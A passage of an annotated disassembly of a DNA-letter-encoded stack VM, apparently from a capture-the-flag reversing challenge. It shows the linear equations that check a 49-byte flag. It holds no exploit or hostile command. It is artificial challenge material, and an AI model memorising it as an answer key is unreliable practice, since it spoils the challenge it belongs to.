push(#00000046)\n0c05a : AG               push(pop() * pop())\n0c05c : ATTTAAATTTTT     push(mem[#02a0])\n0c068 : TTTTTATTTTTT     push(#00000080)\n0c074 : AG               push(pop() * pop())\n0c076 : ATGTAAATTTTT     push(mem[#02a1])\n0c082 : TTTCCGTTTTTT     push(#0000007c)\n0c08e : AG               push(pop() * pop())\n0c090 : ATATAAATTTTT     push(mem[#02a2])\n0c09c : TTAGTTTTTTTT     push(#00000006)\n0c0a8 : AG               push(pop() * pop())\n0c0aa : ATCTAAATTTTT     push(mem[#02a3])\n0c0b6 : TTCGCCTTTTTT     push(#000000f7)\n0c0c2 : AG               push(pop() * pop())\n0c0c4 : ATTGAAATTTTT     push(mem[#02a4])\n0c0d0 : TTTGCTTTTTTT     push(#00000034)\n0c0dc : AG               push(pop() * pop())\n0c0de : ATGGAAATTTTT     push(mem[#02a5])\n0c0ea : TTTCGATTTTTT     push(#0000009c)\n0c0f6 : AG               push(pop() * pop())\n0c0f8 : ATAGAAATTTTT     push(mem[#02a6])\n0c104 : TTGTTTTTTTTT     push(#00000001)\n0c110 : AG               push(pop() * pop())\n0c112 : ATCGAAATTTTT     push(mem[#02a7])\n0c11e : TTGATATTTTTT     push(#00000089)\n0c12a : AG               push(pop() * pop())\n0c12c : ATTAAAATTTTT     push(mem[#02a8])\n0c138 : TTCCTGTTTTTT     push(#0000004f)\n0c144 : AG               push(pop() * pop())\n0c146 : ATGAAAATTTTT     push(mem[#02a9])\n0c152 : TTACAATTTTTT     push(#000000ae)\n0c15e : AG               push(pop() * pop())\n0c160 : ATAAAAATTTTT     push(mem[#02aa])\n0c16c : TTGGTGTTTTTT     push(#00000045)\n0c178 : AG               push(pop() * pop())\n0c17a : ATCAAAATTTTT     push(mem[#02ab])\n0c186 : TTAAAATTTTTT     push(#000000aa)\n0c192 : AG               push(pop() * pop())\n0c194 : ATTCAAATTTTT     push(mem[#02ac])\n0c1a0 : TTATAGTTTTTT     push(#00000062)\n0c1ac : AG               push(pop() * pop())\n0c1ae : ATGCAAATTTTT     push(mem[#02ad])\n0c1ba : TTAGACTTTTTT     push(#000000e6)\n0c1c6 : AG               push(pop() * pop())\n0c1c8 : ATACAAATTTTT     push(mem[#02ae])\n0c1d4 : TTGGGCTTTTTT     push(#000000d5)\n0c1e0 : AG               push(pop() * pop())\n0c1e2 : ATCCAAATTTTT     push(mem[#02af])\n0c1ee : TTAGAGTTTTTT     push(#00000066)\n0c1fa : AG               push(pop() * pop())\n0c1fc : ATTTCAATTTTT     push(mem[#02b0])\n0c208 : TTGTATTTTTTT     push(#00000021)\n0c214 : AG               push(pop() * pop())\n0c216 : TG               push(pop() + pop())\n0c218 : TG               push(pop() + pop())\n0c21a : TG               push(pop() + pop())\n0c21c : TG               push(pop() + pop())\n0c21e : TG               push(pop() + pop())\n0c220 : TG               push(pop() + pop())\n0c222 : TG               push(pop() + pop())\n0c224 : TG               push(pop() + pop())\n0c226 : TG               push(pop() + pop())\n0c228 : TG               push(pop() + pop())\n0c22a : TG               push(pop() + pop())\n0c22c : TG               push(pop() + pop())\n0c22e : TG               push(pop() + pop())\n0c230 : TG               push(pop() + pop())\n0c232 : TG               push(pop() + pop())\n0c234 : TG               push(pop() + pop())\n0c236 : TG               push(pop() + pop())\n0c238 : TG               push(pop() + pop())\n0c23a : TG               push(pop() + pop())\n0c23c : TG               push(pop() + pop())\n0c23e : TG               push(pop() + pop())\n0c240 : TG               push(pop() + pop())\n0c242 : TG               push(pop() + pop())\n0c244 : TG               push(pop() + pop())\n0c246 : TG               push(pop() + pop())\n0c248 : TG               push(pop() + pop())\n0c24a : TG               push(pop() + pop())\n0c24c : TG               push(pop() + pop())\n0c24e : TG               push(pop() + pop())\n0c250 : TG               push(pop() + pop())\n0c252 : TG               push(pop() + pop())\n0c254 : TG               push(pop() + pop())\n0c256 : TG               push(pop() + pop())\n0c258 : TG               push(pop() + pop())\n0c25a : TG               push(pop() + pop())\n0c25c : TG               push(pop() + pop())\n0c25e : TG               push(pop() + pop())\n0c260 : TG               push(pop() + pop())\n0c262 : TG               push(pop() + pop())\n0c264 : TG               push(pop() + pop())\n0c266 : TG               push(pop() + pop())\n0c268 : TG               push(pop() + pop())\n0c26a : TG               push(pop() + pop())\n0c26c : TG               push(pop() + pop())\n0c26e : TG               push(pop() + pop())\n0c270 : TG               push(pop() + pop())\n0c272 : TG               push(pop() + pop())\n0c274 : TG               push(pop() + pop())\n0c276 : CTTCTATTGTTT     mem[#108c] := pop()           memory[#0108c] := ((flag[0] * 157) + ((flag[1] * 177) + ((flag[2] * 129) + ((flag[3] * 30) + ((flag[4] * 248) + ((flag[5] * 141) + ((flag[6] * 245) + ((flag[7] * 255) + ((flag[8] * 19) + ((flag[9] * 91) + ((flag[10] * 249) + ((flag[11] * 52) + ((flag[12] * 3) + ((flag[13] * 211) + ((flag[14] * 225) + ((flag[15] * 82) + ((flag[16] * 142) + ((flag[17] * 212) + ((flag[18] * 72) + ((flag[19] * 223) + ((flag[20] * 175) + ((flag[21] * 219) + ((flag[22] * 22) + ((flag[23] * 211) + ((flag[24] * 250) + ((flag[25] * 121) + ((flag[26] * 209) + ((flag[27] * 45) + ((flag[28] * 70) + ((flag[29] * 128) + ((flag[30] * 208) + ((flag[31] * 70) + ((flag[32] * 128) + ((flag[33] * 124) + ((flag[34] * 6) + ((flag[35] * 247) + ((flag[36] * 52) + ((flag[37] * 156) + ((flag[38] * 1) + ((flag[39] * 137) + ((flag[40] * 79) + ((flag[41] * 174) + ((flag[42] * 69) + ((flag[43] * 170) + ((flag[44] * 98) + ((flag[45] * 230) + ((flag[46] * 213) + ((flag[47] * 102) + (flag[48] * 33)))))))))))))))))))))))))))))))))))))))))))))))))\n0c282 : ATTTTAATTTTT     push(mem[#0280])\n0c28e : TTTCATTTTTTT     push(#0000002c)\n0c29a : AG               push(pop() * pop())\n0c29c : ATGTTAATTTTT     push(mem[#0281])\n0c2a8 : TTAGCCTTTTTT     push(#000000f6)\n0c2b4 : AG               push(pop() * pop())\n0c2b6 : ATATTAATTTTT     push(mem[#0282])\n0c2c2 : TTGTGCTTTTTT     push(#000000d1)\n0c2ce : AG               push(pop() * pop())\n0c2d0 : ATCTTAATTTTT     push(mem[#0283])\n0c2dc : TTTCACTTTTTT     push(#000000ec)\n0c2e8 : AG               push(pop() * pop())\n0c2ea : ATTGTAATTTTT     push(mem[#0284])\n0c2f6 : TTAGTGTTTTTT     push(#00000046)\n0c302 : AG               push(pop() * pop())\n0c304 : ATGGTAATTTTT     push(mem[#0285])\n0c310 : TTAGTGTTTTTT     push(#00000046)\n0c31c : AG               push(pop() * pop())\n0c31e : ATAGTAATTTTT     push(mem[#0286])\n0c32a : TTTGCATTTTTT     push(#000000b4)\n0c336 : AG               push(pop() * pop())\n0c338 : ATCGTAATTTTT     push(mem[#0287])\n0c344 : TTCGTGTTTTTT     push(#00000047)\n0c350 : AG               push(pop() * pop())\n0c352 : ATTATAATTTTT     push(mem[#0288])\n0c35e : TTCAGATTTTTT     push(#0000009b)\n0c36a : AG               push(pop() * pop())\n0c36c : ATGATAATTTTT     push(mem[#0289])\n0c378 : TTCCTCTTTTTT     push(#000000cf)\n0c384 : AG               push(pop() * pop())\n0c386 : ATAATAATTTTT     push(mem[#028a])\n0c392 : TTTGACTTTTTT     push(#000000e4)\n0c39e : AG               push(pop() * pop())\n0c3a0 : ATCATAATTTTT     push(mem[#028b])\n0c3ac : TTACTTTTTTTT     push(#0000000e)\n0c3b8 : AG               push(pop() * pop())\n0c3ba : ATTCTAATTTTT     push(mem[#028c])\n0c3c6 : TTGATATTTTTT     push(#00000089)\n0c3d2 : AG               push(pop() * pop())\n0c3d4 : ATGCTAATTTTT     push(mem[#028d])\n0c3e0 : TTCAATTTTTTT     push(#0000002b)\n0c3ec : AG               push(pop() * pop())\n0c3ee : ATACTAATTTTT     push(mem[#028e])\n0c3fa : TTACGGTTTTTT     push(#0000005e)\n0c406 : AG               push(pop() * pop())\n0c408 : ATCCTAATTTTT     push(mem[#028f])\n0c414 : TTGCATTTTTTT     push(#0000002d)\n0c420 : AG               push(pop() * pop())\n0c422 : ATTTGAATTTTT     push(mem[#0290])\n0c42e : TTGGCTTTTTTT     push(#00000035)\n0c43a : AG               push(pop() * pop())\n0c43c : ATGTGAATTTTT     push(mem[#0291])\n0c448 : TTTTCATTTTTT     push(#000000b0)\n0c454 : AG               push(pop() * pop())\n0c456 : ATATGAATTTTT     push(mem[#0292])\n0c462 : TTGACGTTTTTT     push(#00000079)\n0c46e : AG               push(pop() * pop())\n0c470 : ATCTGAATTTTT     push(mem[#0293])\n0c47c : TTCCCCTTTTTT     push(#000000ff)\n0c488 : AG               push(pop() * pop())\n0c48a : ATTGGAATTTTT     push(mem[#0294])\n0c496 : TTACTCTTTTTT     push(#000000ce)\n0c4a2 : AG               push(pop() * pop())\n0c4a4 : ATGGGAATTTTT     push(mem[#0295])\n0c4b0 : TTTACTTTTTTT     push(#00000038)\n0c4bc : AG               push(pop() * pop())\n0c4be : ATAGGAATTTTT     push(mem[#0296])\n0c4ca : TTGCCTTTTTTT     push(#0000003d)\n0c4d6 : AG               push(pop() * pop())\n0c4d8 : ATCGGAATTTTT     push(mem[#0297])\n0c4e4 : TTTCTATTTTTT     push(#0000008c)\n0c4f0 : AG               push(pop() * pop())\n0c4f2 : ATTAGAATTTTT     push(mem[#0298])\n0c4fe : TTCCCATTTTTT     push(#000000bf)\n0c50a : AG               push(pop() * pop())\n0c50c : ATGAGAATTTTT     push(mem[#0299])\n0c518 : TTCGGGTTTTTT     push(#00000057)\n0c524 : AG               push(pop() * pop())\n0c526 : ATAAGAATTTTT     push(mem[#029a])\n0c532 : TTGGTCTTTTTT     push(#000000c5)\n0c53e : AG               push(pop() * pop())\n0c540 : ATCAGAATTTTT     push(mem[#029b])\n0c54c : TTACTATTTTTT     push(#0000008e)\n0c558 : AG               push(pop() * pop())\n0c55a : ATTCGAATTTTT     push(mem[#029c])\n0c566 : TTCAGATTTTTT     push(#0000009b)\n0c572 : AG               push(pop() * pop())\n0c574 : ATGCGAATTTTT     push(mem[#029d])\n0c580 : TTCGCTTTTTTT     push(#00000037)\n0c58c : AG               push(pop() * pop())\n0c58e : ATACGAATTTTT     push(mem[#029e])\n0c59a : TTCTTGTTTTTT     push(#00000043)\n0c5a6 : AG               push(pop() * pop())\n0c5a8 : ATCCGAATTTTT     push(mem[#029f])\n0c5b4 : TTCTGTTTTTTT     push(#00000013)\n0c5c0 : AG               push(pop() * pop())\n0c5c2 : ATTTAAATTTTT     push(mem[#02a0])\n0c5ce : TTCATATTTTTT     push(#0000008b)\n0c5da : AG               push(pop() * pop())\n0c5dc : ATGTAAATTTTT     push(mem[#02a1])\n0c5e8 : TTCAGATTTTTT     push(#0000009b)\n0c5f4 : AG               push(pop() * pop())\n0c5f6 : ATATAAATTTTT     push(mem[#02a2])\n0c602 : TTGGGTTTTTTT     push(#00000015)\n0c60e : AG               push(pop() * pop())\n0c610 : ATCTAAATTTTT     push(mem[#02a3])\n0c61c : TTAAAGTTTTTT     push(#0000006a)\n0c628 : AG               push(pop() * pop())\n0c62a : ATTGAAATTTTT     push(mem[#02a4])\n0c636 : TTTAGGTTTTTT     push(#00000058)\n0c642 : AG               push(pop() * pop())\n0c644 : ATGGAAATTTTT     push(mem[#02a5])\n0c650 : TTCCACTTTTTT     push(#000000ef)\n0c65c : AG               push(pop() * pop())\n0c65e : ATAGAAATTTTT     push(mem[#02a6])\n0c66a : TTTTACTTTTTT     push(#000000e0)\n0c676 : AG               push(pop() * pop())\n0c678 : ATCGAAATTTTT     push(mem[#02a7])\n0c684 : TTTTGCTTTTTT     push(#000000d0)\n0c690 : AG               push(pop() * pop())\n0c692 : ATTAAAATTTTT     push(mem[#02a8])\n0c69e : TTCATCTTTTTT     push(#000000cb)\n0c6aa : AG               push(pop() * pop())\n0c6ac : ATGAAAATTTTT     push(mem[#02a9])\n0c6b8 : TTGCATTTTTTT     push(#0000002d)\n0c6c4 : AG               push(pop() * pop())\n0c6c6 : ATAAAAATTTTT     push(mem[#02aa])\n0c6d2 : TTTGGCTTTTTT     push(#000000d4)\n0c6de : AG               push(pop() * pop())\n0c6e0 : ATCAAAATTTTT     push(mem[#02ab])\n0c6ec : TTACCTTTTTTT     push(#0000003e)\n0c6f8 : AG               push(pop() * pop())\n0c6fa : ATTCAAATTTTT     push(mem[#02ac])\n0c706 : TTGCAATTTTTT     push(#000000ad)\n0c712 : AG               push(pop() * pop())\n0c714 : ATGCAAATTTTT     push(mem[#02ad])\n0c720 : TTACAATTTTTT     push(#000000ae)\n0c72c : AG               push(pop() * pop())\n0c72e : ATACAAATTTTT     push(mem[#02ae])\n0c73a : TTAACTTTTTTT     push(#0000003a)\n0c746 : AG               push(pop() * pop())\n0c748 : ATCCAAATTTTT     push(mem[#02af])\n0c754 : TTCTACTTTTTT     push(#000000e3)\n0c760 : AG               push(pop() * pop())\n0c762 : ATTTCAATTTTT     push(mem[#02b0])\n0c76e : TTAGCTTTTTTT     push(#00000036)\n0c77a : AG               push(pop() * pop())\n0c77c : TG               push(pop() + pop())\n0c77e : TG               push(pop() + pop())\n0c780 : TG               push(pop() + pop())\n0c782 : TG               push(pop() + pop())\n0c784 : TG               push(pop() + pop())\n0c786 : TG               push(pop() + pop())\n0c788 : TG               push(pop() + pop())\n0c78a : TG               push(pop() + pop())\n0c78c : TG               push(pop() + pop())\n0c78e : TG               push(pop() + pop())\n0c790 : TG               push(pop() + pop())\n0c792 : TG               push(pop() + pop())\n0c794 : TG               push(pop() + pop())\n0c796 : TG               push(pop() + pop())\n0c798 : TG               push(pop() + pop())\n0c79a : TG               push(pop() + pop())\n0c79c : TG               push(pop() + pop())\n0c79e : TG               push(pop() + pop())\n0c7a0 : TG               push(pop() + pop())\n0c7a2 : TG               push(pop() + pop())\n0c7a4 : TG               push(pop() + pop())\n0c7a6 : TG               push(pop() + pop())\n0c7a8 : TG               push(pop() + pop())\n0c7aa : TG               push(pop() + pop())\n0c7ac : TG               push(pop() + pop())\n0c7ae : TG               push(pop() + pop())\n0c7b0 : TG               push(pop() + pop())\n0c7b2 : TG               push(pop() + pop())\n0c7b4 : TG               push(pop() + pop())\n0c7b6 : TG               push(pop() + pop())\n0c7b8 : TG               push(pop() + pop())\n0c7ba : TG               push(pop() + pop())\n0c7bc : TG               push(pop() + pop())\n0c7be : TG               push(pop() + pop())\n0c7c0 : TG               push(pop() + pop())\n0c7c2 : TG               push(pop() + pop())\n0c7c4 : TG               push(pop() + pop())\n0c7c6 : TG               push(pop() + pop())\n0c7c8 : TG               push(pop() + pop())\n0c7ca : TG               push(pop() + pop())\n0c7cc : TG               push(pop() + pop())\n0c7ce : TG               push(pop() + pop())\n0c7d0 : TG               push(pop() + pop())\n0c7d2 : TG               push(pop() + pop())\n0c7d4 : TG               push(pop() + pop())\n0c7d6 : TG               push(pop() + pop())\n0c7d8 : TG               push(pop() + pop())\n0c7da : TG               push(pop() + pop())\n0c7dc : CTTTGATTGTTT     mem[#1090] := pop()           memory[#01090] := ((flag[0] * 44) + ((flag[1] * 246) + ((flag[2] * 209) + ((flag[3] * 236) + ((flag[4] * 70) + ((flag[5] * 70) + ((flag[6] * 180) + ((flag[7] * 71) + ((flag[8] * 155) + ((flag[9] * 207) + ((flag[10] * 228) + ((flag[11] * 14) + ((flag[12] * 137) + ((flag[13] * 43) + ((flag[14] * 94) + ((flag[15] * 45) + ((flag[16] * 53) + ((flag[17] * 176) + ((flag[18] * 121) + ((flag[19] * 255) + ((flag[20] * 206) + ((flag[21] * 56) + ((flag[22] * 61) + ((flag[23] * 140) + ((flag[24] * 191) + ((flag[25] * 87) + ((flag[26] * 197) + ((flag[27] * 142) + ((flag[28] * 155) + ((flag[29] * 55) + ((flag[30] * 67) + ((flag[31] * 19) + ((flag[32] * 139) + ((flag[33] * 155) + ((flag[34] * 21) + ((flag[35] * 106) + ((flag[36] * 88) + ((flag[37] * 239) + ((flag[38] * 224) + ((flag[39] * 208) + ((flag[40] * 203) + ((flag[41] * 45) + ((flag[42] * 212) + ((flag[43] * 62) + ((flag[44] * 173) + ((flag[45] * 174) + ((flag[46] * 58) + ((flag[47] * 227) + (flag[48] * 54)))))))))))))))))))))))))))))))))))))))))))))))))\n0c7e8 : ATTTTAATTTTT     push(mem[#0280])\n0c7f4 : TTAGTTTTTTTT     push(#00000006)\n0c800 : AG               push(pop() * pop())\n0c802 : ATGTTAATTTTT     push(mem[#0281])\n0c80e : TTCTCATTTTTT     push(#000000b3)\n0c81a : AG               push(pop() * pop())\n0c81c : ATATTAATTTTT     push(mem[#0282])\n0c828 : TTCTTTTTTTTT     push(#00000003)\n0c834 : AG               push(pop() * pop())\n0c836 : ATCTTAATTTTT     push(mem[#0283])\n0c842 : TTACCGTTTTTT     push(#0000007e)\n0c84e : AG               push(pop() * pop())\n0c850 : ATTGTAATTTTT     push(mem[#0284])\n0c85c : TTGGGATTTTTT     push(#00000095)\n0c868 : AG               push(pop() * pop())\n0c86a : ATGGTAATTTTT     push(mem[#0285])\n0c876 : TTCGAATTTTTT     push(#000000a7)\n0c882 : AG               push(pop() * pop())\n0c884 : ATAGTAATTTTT     push(mem[#0286])\n0c890 : TTTCAGTTTTTT     push(#0000006c)\n0c89c : AG               push(pop() * pop())\n0c89e : ATCGTAATTTTT     push(mem[#0287])\n0c8aa : TTAGGATTTTTT     push(#00000096)\n0c8b6 : AG               push(pop() * pop())\n0c8b8 : ATTATAATTTTT     push(mem[#0288])\n0c8c4 : TTGTATTTTTTT     push(#00000021)\n0c8d0 : AG               push(pop() * pop())\n0c8d2 : ATGATAATTTTT     push(mem[#0289])\n0c8de : TTCAGCTTTTTT     push(#000000db)\n0c8ea : AG               push(pop() * pop())\n0c8ec : ATAATAATTTTT     push(mem[#028a])\n0c8f8 : TTAGTCTTTTTT     push(#000000c6)\n0c904 : AG               push(pop() * pop())\n0c906 : ATCATAATTTTT     push(mem[#028b])\n0c912 : TTGAACTTTTTT     push(#000000e9)\n0c91e : AG               push(pop() * pop())\n0c920 : ATTCTAATTTTT     push(mem[#028c])\n0c92c : TTCACCTTTTTT     push(#000000fb)\n0c938 : AG               push(pop() * pop())\n0c93a : ATGCTAATTTTT     push(mem[#028d])\n0c946 : TTTAAATTTTTT     push(#000000a8)\n0c952 : AG               push(pop() * pop())\n0c954 : ATACTAATTTTT     push(mem[#028e])\n0c960 : TTCTCGTTTTTT     push(#00000073)\n0c96c : AG               push(pop() * pop())\n0c96e : ATCCTAATTTTT     push(mem[#028f])\n0c97a : TTTGATTTTTTT     push(#00000024)\n0c986 : AG               push(pop() * pop())\n0c988 : ATTTGAATTTTT     push(mem[#0290])\n0c994 : TTCGCTTTTTTT     push(#00000037)\n0c9a0 : AG               push(pop() * pop())\n0c9a2 : ATGTGAATTTTT     push(mem[#0291])\n0c9ae : TTTTAATTTTTT     push(#000000a0)\n0c9ba : AG               push(pop() * pop())\n0c9bc : ATATGAATTTTT     push(mem[#0292])\n0c9c8 : TTCAACTTTTTT     push(#000000eb)\n0c9d4 : AG               push(pop() * pop())\n0c9d6 : ATCTGAATTTTT     push(mem[#0293])\n0c9e2 : TTTTGTTTTTTT     push(#00000010)\n0c9ee : AG               push(pop() * pop())\n0c9f0 : ATTGGAATTTTT     push(mem[#0294])\n0c9fc : TTTCTGTTTTTT     push(#0000004c)\n0ca08 : AG               push(pop() * pop())\n0ca0a : ATGGGAATTTTT     push(mem[#0295])\n0ca16 : TTACTATTTTTT     push(#0000008e)\n0ca22 : AG               push(pop() * pop())\n0ca24 : ATAGGAATTTTT     push(mem[#0296])\n0ca30 : TTTGACTTTTTT     push(#000000e4)\n0ca3c : AG               push(pop() * pop())\n0ca3e : ATCGGAATTTTT     push(mem[#0297])\n0ca4a : TTCACGTTTTTT     push(#0000007b)\n0ca56 : AG               push(pop() * pop())\n0ca58 : ATTAGAATTTTT     push(mem[#0298])\n0ca64 : TTTACATTTTTT     push(#000000b8)\n0ca70 : AG               push(pop() * pop())\n0ca72 : ATGAGAATTTTT     push(mem[#0299])\n0ca7e : TTGCGCTTTTTT     push(#000000dd)\n0ca8a : AG               push(pop() * pop())\n0ca8c : ATAAGAATTTTT     push(mem[#029a])\n0ca98 : TTTGCGTTTTTT     push(#00000074)\n0caa4 : AG               push(pop() * pop())\n0caa6 : ATCAGAATTTTT     push(mem[#029b])\n0cab2 : TTAATGTTTTTT     push(#0000004a)\n0cabe : AG               push(pop() * pop())\n0cac0 : ATTCGAATTTTT     push(mem[#029c])\n0cacc : TTGGGGTTTTTT     push(#00000055)\n0cad8 : AG               push(pop() * pop())\n0cada : ATGCGAATTTTT     push(mem[#029d])\n0cae6 : TTCTGATTTTTT     push(#00000093)\n0caf2 : AG               push(pop() * pop())\n0caf4 : ATACGAATTTTT     push(mem[#029e])\n0cb00 : TTCACTTTTTTT     push(#0000003b)\n0cb0c : AG               push(pop() * pop())\n0cb0e : ATCCGAATTTTT     push(mem[#029f])\n0cb1a : TTGTCGTTTTTT     push(#00000071)\n0cb26 : AG               push(pop() * pop())\n0cb28 : ATTTAAATTTTT     push(mem[#02a0])\n0cb34 : TTGCCTTTTTTT     push(#0000003d)\n0cb40 : AG               push(pop() * pop())\n0cb42 : ATGTAAATTTTT     push(mem[#02a1])\n0cb4e : TTAGAATTTTTT     push(#000000a6)\n0cb5a : AG               push(pop() * pop())\n0cb5c : ATATAAATTTTT     push(mem[#02a2])\n0cb68 : TTGGCCTTTTTT     push(#000000f5)\n0cb74 : AG               push(pop() * pop())\n0cb76 : ATCTAAATTTTT     push(mem[#02a3])\n0cb82 : TTCGGTTTTTTT     push(#00000017)\n0cb8e : AG               push(pop() * pop())\n0cb90 : ATTGAAATTTTT     push(mem[#02a4])\n0cb9c : TTTCAATTTTTT     push(#000000ac)\n0cba8 : AG               push(pop() * pop())\n0cbaa : ATGGAAATTTTT     push(mem[#02a5])\n0cbb6 : TTTGTATTTTTT     push(#00000084)\n0cbc2 : AG               push(pop() * pop())\n0cbc4 : ATAGAAATTTTT     push(mem[#02a6])\n0cbd0 : TTAATTTTTTTT     push(#0000000a)\n0cbdc : AG               push(pop() * pop())\n0cbde : ATCGAAATTTTT     push(mem[#02a7])\n0cbea : TTTAGTTTTTTT     push(#00000018)\n0cbf6 : AG               push(pop() * pop())\n0cbf8 : ATTAAAATTTTT     push(mem[#02a8])\n0cc04 : TTCGTCTTTTTT     push(#000000c7)\n0cc10 : AG               push(pop() * pop())\n0cc12 : ATGAAAATTTTT     push(mem[#02a9])\n0cc1e : TTCCATTTTTTT     push(#0000002f)\n0cc2a : AG               push(pop() * pop())\n0cc2c : ATAAAAATTTTT     push(mem[#02aa])\n0cc38 : TTCGTCTTTTTT     push(#000000c7)\n0cc44 : AG               push(pop() * pop())\n0cc46 : ATCAAAATTTTT     push(mem[#02ab])\n0cc52 : TTATTGTTTTTT     push(#00000042)\n0cc5e : AG               push(pop() * pop())\n0cc60 : ATTCAAATTTTT     push(mem[#02ac])\n0cc6c : TTCATCTTTTTT     push(#000000cb)\n0cc78 : AG               push(pop() * pop())\n0cc7a : ATGCAAATTTTT     push(mem[#02ad])\n0cc86 : TTGGTCTTTTTT     push(#000000c5)\n0cc92 : AG               push(pop() * pop())\n0cc94 : ATACAAATTTTT     push(mem[#02ae])\n0cca0 : TTGCCCTTTTTT     push(#000000fd)\n0ccac : AG               push(pop() * pop())\n0ccae : ATCCAAATTTTT     push(mem[#02af])\n0ccba : TTGTTATTTTTT     push(#00000081)\n0ccc6 : AG               push(pop() * pop())\n0ccc8 : ATTTCAATTTTT     push(mem[#02b0])\n0ccd4 : TTGTTCTTTTTT     push(#000000c1)\n0cce0 : AG               push(pop() * pop())\n0cce2 : TG               push(pop() + pop())\n0cce4 : TG               push(pop() + pop())\n0cce6 : TG               push(pop() + pop())\n0cce8 : TG               push(pop() + pop())\n0ccea : TG               push(pop() + pop())\n0ccec : TG               push(pop() + pop())\n0ccee : TG               push(pop() + pop())\n0ccf0 : TG               push(pop() + pop())\n0ccf2 : TG               push(pop() + pop())\n0ccf4 : TG               push(pop() + pop())\n0ccf6 : TG               push(pop() + pop())\n0ccf8 : TG               push(pop() + pop())\n0ccfa : TG               push(pop() + pop())\n0ccfc : TG               push(pop() + pop())\n0ccfe : TG               push(pop() + pop())\n0cd00 : TG               push(pop() + pop())\n0cd02 : TG               push(pop() + pop())\n0cd04 : TG               push(pop() + pop())\n0cd06 : TG               push(pop() + pop())\n0cd08 : TG               push(pop() + pop())\n0cd0a : TG               push(pop() + pop())\n0cd0c : TG               push(pop() + pop())\n0cd0e : TG               push(pop() + pop())\n0cd10 : TG               push(pop() + pop())\n0cd12 : TG               push(pop() + pop())\n0cd14 : TG               push(pop() + pop())\n0cd16 : TG               push(pop() + pop())\n0cd18 : TG               push(pop() + pop())\n0cd1a : TG               push(pop() + pop())\n0cd1c : TG               push(pop() + pop())\n0cd1e : TG               push(pop() + pop())\n0cd20 : TG               push(pop() + pop())\n0cd22 : TG               push(pop() + pop())\n0cd24 : TG               push(pop() + pop())\n0cd26 : TG               push(pop() + pop())\n0cd28 : TG               push(pop() + pop())\n0cd2a : TG               push(pop() + pop())\n0cd2c : TG               push(pop() + pop())\n0cd2e : TG               push(pop() + pop())\n0cd30 : TG               push(pop() + pop())\n0cd32 : TG               push(pop() + pop())\n0cd34 : TG               push(pop() + pop())\n0cd36 : TG               push(pop() + pop())\n0cd38 : TG               push(pop() + pop())\n0cd3a : TG               push(pop() + pop())\n0cd3c : TG               push(pop() + pop())\n0cd3e : TG               push(pop() + pop())\n0cd40 : TG               push(pop() + pop())\n0cd42 : CTTGGATTGTTT     mem[#1094] := pop()           memory[#01094] := ((flag[0] * 6) + ((flag[1] * 179) + ((flag[2] * 3) + ((flag[3] * 126) + ((flag[4] * 149) + ((flag[5] * 167) + ((flag[6] * 108) + ((flag[7] * 150) + ((flag[8] * 33) + ((flag[9] * 219) + ((flag[10] * 198) + ((flag[11] * 233) + ((flag[12] * 251) + ((flag[13] * 168) + ((flag[14] * 115) + ((flag[15] * 36) + ((flag[16] * 55) + ((flag[17] * 160) + ((flag[18] * 235) + ((flag[19] * 16) + ((flag[20] * 76) + ((flag[21] * 142) + ((flag[22] * 228) + ((flag[23] * 123) + ((flag[24] * 184) + ((flag[25] * 221) + ((flag[26] * 116) + ((flag[27] * 74) + ((flag[28] * 85) + ((flag[29] * 147) + ((flag[30] * 59) + ((flag[31] * 113) + ((flag[32] * 61) + ((flag[33] * 166) + ((flag[34] * 245) + ((flag[35] * 23) + ((flag[36] * 172) + ((flag[37] * 132) + ((flag[38] * 10) + ((flag[39] * 24) + ((flag[40] * 199) + ((flag[41] * 47) + ((flag[42] * 199) + ((flag[43] * 66) + ((flag[44] * 203) + ((flag[45] * 197) + ((flag[46] * 253) + ((flag[47] * 129) + (flag[48] * 193)))))))))))))))))))))))))))))))))))))))))))))))))\n0cd4e : ATTTTAATTTTT     push(mem[#0280])\n0cd5a : TTGTCGTTTTTT     push(#00000071)\n0cd66 : AG               push(pop() * pop())\n0cd68 : ATGTTAATTTTT     push(mem[#0281])\n0cd74 : TTACACTTTTTT     push(#000000ee)\n0cd80 : AG               push(pop() * pop())\n0cd82 : ATATTAATTTTT     push(mem[#0282])\n0cd8e : TTAATTTTTTTT     push(#0000000a)\n0cd9a : AG               push(pop() * pop())\n0cd9c : ATCTTAATTTTT     push(mem[#0283])\n0cda8 : TTCTGTTTTTTT     push(#00000013)\n0cdb4 : AG               push(pop() * pop())\n0cdb6 : ATTGTAATTTTT     push(mem[#0284])\n0cdc2 : TTCGACTTTTTT     push(#000000e7)\n0cdce : AG               push(pop() * pop())\n0cdd0 : ATGGTAATTTTT     push(mem[#0285])\n0cddc : TTCATCTTTTTT     push(#000000cb)\n0cde8 : AG               push(pop() * pop())\n0cdea : ATAGTAATTTTT     push(mem[#0286])\n0cdf6 : TTCTCTTTTTTT     push(#00000033)\n0ce02 : AG               push(pop() * pop())\n0ce04 : ATCGTAATTTTT     push(mem[#0287])\n0ce10 : TTAATATTTTTT     push(#0000008a)\n0ce1c : AG               push(pop() * pop())\n0ce1e : ATTATAATTTTT     push(mem[#0288])\n0ce2a : TTCAGCTTTTTT     push(#000000db)\n0ce36 : AG               push(pop() * pop())\n0ce38 : ATGATAATTTTT     push(mem[#0289])\n0ce44 : TTATGCTTTTTT     push(#000000d2)\n0ce50 : AG               push(pop() * pop())\n0ce52 : ATAATAATTTTT     push(mem[#028a])\n0ce5e : TTTTCATTTTTT     push(#000000b0)\n0ce6a : AG               push(pop() * pop())\n0ce6c : ATCATAATTTTT     push(mem[#028b])\n0ce78 : TTTCACTTTTTT     push(#000000ec)\n0ce84 : AG               push(pop() * pop())\n0ce86 : ATTCTAATTTTT     push(mem[#028c])\n0ce92 : TTAGCATTTTTT     push(#000000b6)\n0ce9e : AG               push(pop() * pop())\n0cea0 : ATGCTAATTTTT     push(mem[#028d])\n0ceac : TTCTGATTTTTT     push(#00000093)\n0ceb8 : AG               push(pop() * pop())\n0ceba : ATACTAATTTTT     push(mem[#028e])\n0cec6 : TTCGGTTTTTTT     push(#00000017)\n0ced2 : AG               push(pop() * pop())\n0ced4 : ATCCTAATTTTT     push(mem[#028f])\n0cee0 : TTGAGTTTTTTT     push(#00000019)\n0ceec : AG               push(pop() * pop())\n0ceee : ATTTGAATTTTT     push(mem[#0290])\n0cefa : TTCACCTTTTTT     push(#000000fb)\n0cf06 : AG               push(pop() * pop())\n0cf08 : ATGTGAATTTTT     push(mem[#0291])\n0cf14 : TTTGCTTTTTTT     push(#00000034)\n0cf20 : AG               push(pop() * pop())\n0cf22 : ATATGAATTTTT     